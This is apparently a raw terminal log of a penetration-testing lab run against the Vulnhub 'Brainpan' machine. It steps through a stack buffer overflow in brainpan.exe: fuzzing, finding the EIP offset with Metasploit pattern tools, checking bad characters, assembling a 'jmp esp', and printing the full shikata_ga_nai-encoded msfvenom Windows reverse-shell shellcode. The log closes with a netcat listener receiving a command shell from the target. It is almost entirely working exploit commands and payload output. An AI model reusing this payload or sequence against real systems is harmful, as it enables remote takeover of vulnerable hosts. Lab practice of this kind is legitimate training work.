â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# python brainfuzzer.py 192.168.56.101 9999
Attempting to crash brainpan.exe at 1 bytes
Attempting to crash brainpan.exe at 100 bytes
Attempting to crash brainpan.exe at 200 bytes
Attempting to crash brainpan.exe at 300 bytes
Attempting to crash brainpan.exe at 400 bytes
Attempting to crash brainpan.exe at 500 bytes
Attempting to crash brainpan.exe at 600 bytes
Attempting to crash brainpan.exe at 700 bytes
Attempting to crash brainpan.exe at 800 bytes
Attempting to crash brainpan.exe at 900 bytes
Attempting to crash brainpan.exe at 1000 bytes
Error to connect, check if IP and PORT are correct, or check the debugger
                                                                          
â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# 


â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 900
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9
                                                                          
â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# 

â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# python brainpan1.py 192.168.56.101 9999
Attempt to send buffer overflow to Brainpan.exe

 ---COMPLETED---
                                                                                                                                                                                            
â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# 

â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134                                                       
[*] Exact match at offset 524
                                                                                                                                                                                            
â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# 



â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# python badchars.py 192.168.56.101 9999
Attemping to send buffer overflow to brainpan.exe of 192.168.56.101 9999

---COMPLETED---

â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# locate nasm_shell    
/usr/bin/msf-nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
                                                                                                                                                                                            
â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# cp /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb .

â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm > 

nasm > jmp esp
00000000  FFE4              jmp esp
nasm > 

                                                                       
â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.56.102 -e x86/shikata_ga_nai -b "\x00" -f py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf =  b""
buf += b"\xdb\xdd\xd9\x74\x24\xf4\x5a\x2b\xc9\xbe\x54\x17\x3e"
buf += b"\xd9\xb1\x52\x83\xea\xfc\x31\x72\x13\x03\x26\x04\xdc"
buf += b"\x2c\x3a\xc2\xa2\xcf\xc2\x13\xc3\x46\x27\x22\xc3\x3d"
buf += b"\x2c\x15\xf3\x36\x60\x9a\x78\x1a\x90\x29\x0c\xb3\x97"
buf += b"\x9a\xbb\xe5\x96\x1b\x97\xd6\xb9\x9f\xea\x0a\x19\xa1"
buf += b"\x24\x5f\x58\xe6\x59\x92\x08\xbf\x16\x01\xbc\xb4\x63"
buf += b"\x9a\x37\x86\x62\x9a\xa4\x5f\x84\x8b\x7b\xeb\xdf\x0b"
buf += b"\x7a\x38\x54\x02\x64\x5d\x51\xdc\x1f\x95\x2d\xdf\xc9"
buf += b"\xe7\xce\x4c\x34\xc8\x3c\x8c\x71\xef\xde\xfb\x8b\x13"
buf += b"\x62\xfc\x48\x69\xb8\x89\x4a\xc9\x4b\x29\xb6\xeb\x98"
buf += b"\xac\x3d\xe7\x55\xba\x19\xe4\x68\x6f\x12\x10\xe0\x8e"
buf += b"\xf4\x90\xb2\xb4\xd0\xf9\x61\xd4\x41\xa4\xc4\xe9\x91"
buf += b"\x07\xb8\x4f\xda\xaa\xad\xfd\x81\xa2\x02\xcc\x39\x33"
buf += b"\x0d\x47\x4a\x01\x92\xf3\xc4\x29\x5b\xda\x13\x4d\x76"
buf += b"\x9a\x8b\xb0\x79\xdb\x82\x76\x2d\x8b\xbc\x5f\x4e\x40"
buf += b"\x3c\x5f\x9b\xc7\x6c\xcf\x74\xa8\xdc\xaf\x24\x40\x36"
buf += b"\x20\x1a\x70\x39\xea\x33\x1b\xc0\x7d\xfc\x74\xf2\x1b"
buf += b"\x94\x86\x02\xe5\xdf\x0e\xe4\x8f\x0f\x47\xbf\x27\xa9"
buf += b"\xc2\x4b\xd9\x36\xd9\x36\xd9\xbd\xee\xc7\x94\x35\x9a"
buf += b"\xdb\x41\xb6\xd1\x81\xc4\xc9\xcf\xad\x8b\x58\x94\x2d"
buf += b"\xc5\x40\x03\x7a\x82\xb7\x5a\xee\x3e\xe1\xf4\x0c\xc3"
buf += b"\x77\x3e\x94\x18\x44\xc1\x15\xec\xf0\xe5\x05\x28\xf8"
buf += b"\xa1\x71\xe4\xaf\x7f\x2f\x42\x06\xce\x99\x1c\xf5\x98"
buf += b"\x4d\xd8\x35\x1b\x0b\xe5\x13\xed\xf3\x54\xca\xa8\x0c"
buf += b"\x58\x9a\x3c\x75\x84\x3a\xc2\xac\x0c\x4a\x89\xec\x25"
buf += b"\xc3\x54\x65\x74\x8e\x66\x50\xbb\xb7\xe4\x50\x44\x4c"
buf += b"\xf4\x11\x41\x08\xb2\xca\x3b\x01\x57\xec\xe8\x22\x72"
                                                                       
â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# 

â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# python brainpan3.py 192.168.56.101 9999                        1 â¨¯
Attempting to send buffer overflow to brainpan.exe of 192.168.56.101 9999

---COMPLETED---
                                                                       
â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€#

                                                                       
â”Œâ”€â”€(rootðŸ’€kali)-[~/Pentest/Labs/Vulnhub/Brainpan]
â””â”€# nc -nlvp 443     
listening on [any] 443 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 49159
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Downloads>dir
dir
 Volume in drive C is Windows 7
 Volume Serial Number is D055-099C

 Directory of C:\Users\IEUser\Downloads

02/01/2021  02:34 AM    <DIR>          .
02/01/2021  02:34 AM    <DIR>          ..
10/20/2019  11:43 AM         9,266,237 12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe
02/01/2021  02:34 AM            21,190 brainpan.exe
10/20/2019  11:45 AM        22,749,412 ImmunityDebugger_1_85_setup.exe
10/20/2019  11:46 AM    <DIR>          mona-master
10/20/2019  11:46 AM           155,025 mona-master.zip
01/28/2021  05:47 AM         2,732,032 putty-0.74-installer.msi
               5 File(s)     34,923,896 bytes
               3 Dir(s)  29,090,439,168 bytes free

C:\Users\IEUser\Downloads>

